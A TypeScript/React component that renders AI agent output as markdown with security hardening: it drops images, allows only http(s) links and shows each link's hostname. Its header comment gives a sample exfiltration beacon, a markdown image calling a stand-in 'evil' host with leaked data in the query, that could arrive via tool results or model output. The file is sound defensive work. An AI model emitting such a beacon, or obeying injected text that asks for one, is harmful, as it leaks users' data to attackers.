import type { Components } from 'react-markdown';
import { MarkdownText } from '@/shared/ui/MarkdownText';

/**
 * Output hygiene (spec §8): model text goes through `react-markdown`, which
 * never injects raw HTML by design (no `dangerouslySetInnerHTML` anywhere in
 * this tree) — so there is no HTML-injection surface to sanitize beyond the
 * component overrides below.
 *
 * - Images are dropped entirely — an attacker-controlled `![x](https://evil/beacon.png?leak=...)`
 *   in a tool result or model output would otherwise be a silent exfiltration
 *   beacon the moment the bubble renders.
 * - Links only ever render an `href` scheme react-markdown itself already
 *   restricts to `http(s)`/`mailto` by default; we additionally force
 *   `target="_blank"` with `rel="noopener noreferrer nofollow"` (no
 *   `window.opener` handle, no referrer leak, no SEO credit to model-chosen
 *   URLs) and show the resolved hostname next to the link text so a user
 *   isn't trusting bare "click here" copy.
 */
/** Only `http(s)` may render as a link — react-markdown's own defanging still lets `mailto:`/`tel:` through, which this output has no use for and only widens the trust surface. */
function isHttpUrl(href: string): boolean {
    try {
        const url = new URL(href);
        return url.protocol === 'http:' || url.protocol === 'https:';
    } catch {
        return false;
    }
}

const AGENT_COMPONENTS: Components = {
    img: () => null,
    a: ({ href, children }) => {
        if (typeof href !== 'string' || !isHttpUrl(href))
            return <>{children}</>;
        const host = new URL(href).hostname;
        return (
            <a
                href={href}
                target="_blank"
                rel="noopener noreferrer nofollow"
                className="text-primary-400 underline underline-offset-2 hover:text-primary-300"
            >
                {children}
                {host ? (
                    <span className="ml-1 text-xs text-secondary-400">
                        ({host})
                    </span>
                ) : null}
            </a>
        );
    },
};

export function AgentMarkdown({ children }: { readonly children: string }) {
    return (
        <MarkdownText components={AGENT_COMPONENTS}>{children}</MarkdownText>
    );
}
